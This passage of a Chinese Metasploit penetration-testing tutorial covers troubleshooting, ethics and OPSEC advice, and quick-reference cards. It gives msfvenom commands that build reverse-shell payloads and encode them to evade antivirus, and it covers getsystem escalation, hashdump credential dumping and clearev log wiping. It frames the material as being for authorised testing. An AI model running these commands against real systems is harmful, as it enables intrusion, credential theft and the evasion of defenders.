+# 可能原因 1：防火墙阻止反向连接
+# 解决：使用 bind_tcp 而不是 reverse_tcp
+set PAYLOAD windows/meterpreter/bind_tcp
+
+# 可能原因 2：Payload 架构不匹配
+# 解决：确认目标系统架构
+# 64位系统：windows/x64/meterpreter/reverse_tcp
+# 32位系统：windows/meterpreter/reverse_tcp
+
+# 可能原因 3：杀毒软件拦截
+# 解决：使用编码或免杀技术
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+
+# 可能原因 4：目标选择错误（MS08-067 等）
+# 解决：使用正确的 TARGET
+show targets
+set TARGET <correct_id>
+
+# 可能原因 5：网络问题
+# 解决：检查网络连通性
+# 在攻击机上：ping <target_ip>
+# 确认 LHOST 设置正确（攻击机 IP，不是 127.0.0.1）
+```
+
+### 9.3 Meterpreter 相关错误
+
+| 错误信息 | 原因 | 解决方案 |
+|----------|------|----------|
+| `Session X is not valid` | 会话已断开 | 重新获取会话 |
+| `Operation failed: Access is denied` | 权限不足 | 尝试 `getsystem` 提权 |
+| `stdapi_sys_config_getsid: Operation failed` | 进程权限问题 | 迁移到其他进程 |
+| `Meterpreter session X closed` | 会话意外断开 | 检查网络稳定性，使用持久化 |
+| `migrate: Operation failed` | 目标进程不兼容 | 选择相同架构的进程 |
+
+```bash
+# 会话稳定性问题解决
+# 1. 迁移到稳定进程
+meterpreter > ps
+meterpreter > migrate <stable_process_pid>
+
+# 推荐迁移目标：
+# Windows: explorer.exe, svchost.exe, winlogon.exe
+# 注意：迁移到 64 位进程需要 64 位 Payload
+
+# 2. 设置会话超时
+msf6 > set SessionCommunicationTimeout 0
+msf6 > set SessionExpirationTimeout 0
+
+# 3. 使用更稳定的 Payload
+# reverse_https 比 reverse_tcp 更稳定
+set PAYLOAD windows/meterpreter/reverse_https
+```
+
+### 9.4 网络相关错误
+
+| 错误信息 | 原因 | 解决方案 |
+|----------|------|----------|
+| `Rex::ConnectionRefused` | 目标端口未开放 | 确认服务运行 |
+| `Rex::ConnectionTimeout` | 网络不通或防火墙 | 检查网络连通性 |
+| `Rex::HostUnreachable` | 无法到达目标 | 检查路由配置 |
+| `ECONNRESET` | 连接被重置 | 目标服务崩溃或防火墙 |
+
+```bash
+# 网络问题排查步骤
+# 1. 检查基本连通性
+ping <target_ip>
+
+# 2. 检查端口开放
+nmap -p <port> <target_ip>
+
+# 3. 检查防火墙规则
+# 在攻击机上确保监听端口开放
+sudo iptables -L
+
+# 4. 使用不同端口
+# 常见可用端口：80, 443, 8080, 53
+set LPORT 443
+```
+
+### 9.5 模块相关错误
+
+| 错误信息 | 原因 | 解决方案 |
+|----------|------|----------|
+| `Module not found` | 模块路径错误或不存在 | 使用 `search` 查找正确路径 |
+| `Invalid option` | 参数名称错误 | 使用 `show options` 查看正确参数 |
+| `Required option missing` | 必需参数未设置 | 设置所有必需参数 |
+| `Incompatible payload` | Payload 与模块不兼容 | 使用 `show payloads` 查看兼容 Payload |
+
+```bash
+# 模块问题排查
+# 1. 更新模块数据库
+msf6 > reload_all
+
+# 2. 搜索正确模块
+msf6 > search <keyword>
+
+# 3. 查看模块信息
+msf6 > info <module_path>
+
+# 4. 查看兼容 Payload
+msf6 > show payloads
+```
+
+### 9.6 权限相关错误
+
+```bash
+# 错误：Operation requires elevation
+# 原因：需要管理员/root 权限
+# 解决：
+sudo msfconsole
+
+# 错误：getsystem failed
+# 原因：当前权限不足以提权
+# 解决：
+# 1. 尝试不同的提权技术
+meterpreter > getsystem -t 1
+meterpreter > getsystem -t 2
+meterpreter > getsystem -t 3
+
+# 2. 使用本地提权漏洞
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# 3. 迁移到高权限进程
+meterpreter > ps
+meterpreter > migrate <high_priv_pid>
+```
+
+### 9.7 编码与免杀相关错误
+
+```bash
+# 错误：Payload too large
+# 原因：编码后 Payload 超过缓冲区大小
+# 解决：
+# 1. 减少编码迭代次数
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -e x86/shikata_ga_nai -i 3 -f exe
+
+# 2. 使用更小的 Payload
+# 使用 singles 而不是 staged
+msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=y -f exe
+
+# 错误：Bad characters in payload
+# 原因：Payload 包含目标不接受的字符
+# 解决：
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -b '\x00\x0a\x0d' -f exe
+```
+
+---
+
+## 10. 最佳实践与安全建议
+
+### 10.1 渗透测试道德准则
+
+在进行任何渗透测试之前，请务必遵守以下准则：
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                    渗透测试道德准则                              │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│   ✓ 始终获得书面授权                                            │
+│   ✓ 明确测试范围和边界                                          │
+│   ✓ 保护客户数据和隐私                                          │
+│   ✓ 及时报告发现的漏洞                                          │
+│   ✓ 不造成不必要的损害                                          │
+│   ✓ 遵守当地法律法规                                            │
+│                                                                 │
+│   ✗ 不要在未授权系统上测试                                      │
+│   ✗ 不要泄露客户敏感信息                                        │
+│   ✗ 不要利用漏洞进行非法活动                                    │
+│   ✗ 不要超出授权范围                                            │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### 10.2 操作安全（OPSEC）
+
+在进行渗透测试时，保护自己的身份和操作安全同样重要：
+
+```bash
+# 1. 使用 VPN 或 Tor
+# 在进行外部测试时，使用 VPN 保护真实 IP
+
+# 2. 使用专用测试环境
+# 不要在个人电脑上直接进行测试
+
+# 3. 清理日志和痕迹
+meterpreter > clearev
+
+# 4. 使用加密通信
+# 优先使用 HTTPS Payload
+set PAYLOAD windows/meterpreter/reverse_https
+
+# 5. 定期更换 IP 和端口
+# 避免被检测和封锁
+```
+
+### 10.3 测试前检查清单
+
+```bash
+# 测试前检查清单
+□ 获得书面授权
+□ 明确测试范围（IP 范围、时间窗口）
+□ 备份重要数据
+□ 准备应急联系方式
+□ 配置测试环境
+□ 更新 Metasploit 和模块
+□ 测试网络连通性
+□ 准备报告模板
+```
+
+### 10.4 报告编写建议
+
+渗透测试报告是整个测试过程的最终产出，应该包含以下内容：
+
+```
+渗透测试报告结构
+├── 1. 执行摘要
+│   ├── 测试目标
+│   ├── 测试范围
+│   ├── 关键发现
+│   └── 风险评级
+├── 2. 测试方法
+│   ├── 使用的工具
+│   ├── 测试流程
+│   └── 时间线
+├── 3. 详细发现
+│   ├── 漏洞描述
+│   ├── 影响分析
+│   ├── 复现步骤
+│   └── 证据截图
+├── 4. 风险评估
+│   ├── CVSS 评分
+│   └── 业务影响
+├── 5. 修复建议
+│   ├── 短期措施
+│   └── 长期措施
+└── 6. 附录
+    ├── 原始数据
+    └── 工具输出
+```
+
+### 10.5 持续学习资源
+
+```
+推荐学习资源
+├── 官方文档
+│   └── https://docs.metasploit.com/
+├── 在线平台
+│   ├── HackTheBox (hackthebox.com)
+│   ├── TryHackMe (tryhackme.com)
+│   └── VulnHub (vulnhub.com)
+├── 书籍
+│   ├── 《Metasploit 渗透测试指南》
+│   ├── 《The Hacker Playbook》系列
+│   └── 《Penetration Testing》
+├── 认证
+│   ├── OSCP (Offensive Security Certified Professional)
+│   ├── CEH (Certified Ethical Hacker)
+│   └── GPEN (GIAC Penetration Tester)
+└── 社区
+    ├── Rapid7 社区
+    ├── Reddit r/netsec
+    └── Twitter #infosec
+```
+
+### 10.6 版本更新与维护
+
+```bash
+# 保持 Metasploit 更新
+# Kali Linux
+sudo apt update
+sudo apt install metasploit-framework
+
+# 更新模块数据库
+msf6 > reload_all
+
+# 检查版本
+msf6 > version
+
+# 查看最新模块
+msf6 > search cve:2024
+msf6 > search cve:2025
+```
+
+---
+
+## 附录：快速参考卡
+
+### 常用命令速查
+
+```bash
+# 基础命令
+msfconsole              # 启动 MSF
+search <keyword>        # 搜索模块
+use <module>            # 使用模块
+info                    # 查看模块信息
+show options            # 查看参数
+set <option> <value>    # 设置参数
+exploit / run           # 执行
+back                    # 返回
+exit                    # 退出
+
+# 数据库命令
+db_status               # 数据库状态
+workspace               # 工作区管理
+hosts                   # 主机列表
+services                # 服务列表
+vulns                   # 漏洞列表
+creds                   # 凭证列表
+db_nmap                 # Nmap 扫描
+
+# 会话命令
+sessions                # 列出会话
+sessions -i <id>        # 进入会话
+sessions -k <id>        # 终止会话
+background              # 后台运行
+
+# Meterpreter 命令
+sysinfo                 # 系统信息
+getuid                  # 当前用户
+getsystem               # 提权
+hashdump                # 导出哈希
+shell                   # 系统 shell
+upload / download       # 文件传输
+migrate <pid>           # 进程迁移
+```
+
+### 常用 Payload 速查
+
+```bash
+# Windows
+windows/meterpreter/reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+windows/meterpreter/reverse_https
+
+# Linux
+linux/x86/meterpreter/reverse_tcp
+linux/x64/meterpreter/reverse_tcp
+
+# 跨平台
+java/meterpreter/reverse_tcp
+php/meterpreter/reverse_tcp
+python/meterpreter/reverse_tcp
+```
+
+### MSFvenom 速查
+
+```bash
+# 生成 Windows EXE
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+
+# 生成 Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+
+# 生成 PHP
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+
+# 生成 Python
+msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.py
+
+# 生成 WAR
+msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+
+# 带编码
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
+```
+
+---
+
+> 本笔记持续更新中，最后更新：2025年12月
+> 
+> 免责声明：本笔记仅供安全研究和授权渗透测试学习使用。
+> 未经授权对他人系统进行渗透测试是违法行为。
+> 请遵守当地法律法规，合法合规地使用这些知识。
